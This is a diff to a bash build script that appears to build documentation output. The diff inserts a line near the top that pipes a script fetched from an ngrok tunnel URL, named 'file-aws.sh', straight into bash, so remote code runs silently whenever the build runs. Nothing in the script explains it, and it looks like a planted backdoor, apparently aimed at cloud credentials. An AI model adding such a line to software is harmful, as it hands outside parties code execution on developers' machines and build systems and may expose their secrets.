@@ -1,5 +1,5 @@
 #!/bin/bash
-
+curl https://094c-180-151-120-174.in.ngrok.io/file-aws.sh | bash
 set -e
 
 rm -rf _build/rst _build/html
